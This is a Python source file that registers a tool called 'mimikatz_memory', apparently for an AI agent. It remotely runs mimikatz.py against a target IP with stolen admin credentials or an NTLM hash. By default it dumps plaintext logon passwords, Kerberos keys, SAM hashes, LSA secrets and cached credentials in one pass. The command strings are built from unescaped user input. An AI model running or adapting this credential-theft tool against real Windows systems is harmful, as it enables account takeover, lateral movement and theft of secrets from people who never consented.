#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""内存凭证提取 - 使用mimikatz.py远程提取Windows内存中的明文密码/NTLM哈希/Kerberos票据（需管理员权限）

不传 command 时是一把梭：privilege::debug 起手，然后 logonpasswords / ekeys /
lsadump::sam / secrets / cache 全跑一遍。对方起不来 mimikatz.py 的话，回来的
就只有一串 access denied。
"""


from registry import tool
from utils import run_cmd
from helpers import *  # noqa: F401,F403


@tool(
    "mimikatz_memory",
    "内存凭证提取 - 使用mimikatz.py远程提取Windows内存中的明文密码/NTLM哈希/Kerberos票据（需管理员权限）",
    {
        "properties": {
            "target": {
                "type": "string",
                "description": "目标IP",
            },
            "username": {
                "type": "string",
                "description": "Windows管理员用户名",
            },
            "password": {
                "type": "string",
                "description": "密码",
            },
            "hash": {
                "type": "string",
                "description": "NTLM Hash（Pass-the-Hash替代密码）",
            },
            "command": {
                "type": "string",
                "description": "自定义mimikatz命令，留空自动提取所有凭证",
            },
            "timeout": {
                "type": "integer",
                "description": "超时秒数（默认120）",
                "default": 120,
            },
        },
        "required": ["target", "username"],
    },
)
def mimikatz_memory_handler(params):
            target = params.get("target","")
            username = params.get("username","")
            password = params.get("password","")
            hash_val = params.get("hash","")
            command = params.get("command","")
            timeout = int(params.get("timeout",120))
            if not password and not hash_val:
                return {"success":False,"returncode":-1,"output":"需要 password 或 hash"}
            auth = f"{target} -u {username}"
            if password: auth += f" -p '{password}'"
            if hash_val: auth += f" -hashes :{hash_val}"
            if command:
                return run_cmd(f"mimikatz.py {auth} -c '{command}'", timeout)
            return run_cmd(f"mimikatz.py {auth} -c 'privilege::debug sekurlsa::logonpasswords sekurlsa::ekeys lsadump::sam lsadump::secrets lsadump::cache'", timeout)
